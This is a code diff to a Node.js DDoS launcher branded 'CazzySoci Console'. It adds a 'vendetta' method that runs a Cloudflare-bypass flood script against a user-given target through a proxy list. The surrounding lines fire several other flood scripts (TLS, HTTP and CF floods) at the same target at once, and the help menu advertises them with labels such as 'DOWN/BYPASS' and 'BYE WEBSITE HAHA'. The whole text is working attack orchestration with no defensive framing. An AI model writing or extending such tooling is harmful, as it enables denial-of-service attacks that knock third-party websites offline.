@@ -374,6 +374,10 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
 	  } else if (methods === 'cf') {
        pushOngoing(target, methods, duration)
 	exec(`node ${metode} POST ${target} proxy.txt ${duration} 30 100`)       
+	  sigma()
+	  } else if (methods === 'vendetta') {
+       pushOngoing(target, methods, duration)
+	exec(`node ${metode} ${target} ${duration} 30 100 proxy.txt`)
 	  
 const flood = path.join(__dirname, `/lib/cache/flood.js`);
 const tls = path.join(__dirname, `/lib/cache/tls.js`);
@@ -392,6 +396,7 @@ const mem = path.join(__dirname, `MEM`);
 const kupal = path.join(__dirname, `/lib/cache/jennessee.js`);
 const lol = path.join(__dirname, `/lib/cache/xyecoc.js`);
 const cf = path.join(__dirname, `/lib/cache/CF-FLOODER.js`);
+const vendetta = path.join(__dirname, `/lib/cache/CF-Bypass.js`);
         exec(`node ${flood} ${target} ${duration}`)
         exec(`node ${tls} ${target} ${duration} 100 100`)
         exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
@@ -409,6 +414,7 @@ const cf = path.join(__dirname, `/lib/cache/CF-FLOODER.js`);
 	exec(`node ${kupal} ${target} ${duration} 100 30 proxy.txt --full`)
 	exec(`node ${lol} ${target} ${duration} 30 100 proxy.txt --proxy`)
 	exec(`node ${cf} POST ${target} proxy.txt ${duration} 30 100`)
+	exec(`node ${vendetta} ${target} ${duration} 30 100 proxy.txt`)
 	
 	
 	  
@@ -724,6 +730,7 @@ permen.question('[\x1b[1m\x1b[32mCazzySoci Console\x1b[0m]: \n', (input) => {
 || mem        || Mem Flood server
 || kupal      || DOWN/BYPASS Ex: https://target.com?q=%RAND%
 || lol        || BYE WEBSITE HAHA 
+|| vendetta   || CLOUDFARE BYPASS 
 [=========================================]
 `);
     sigma();
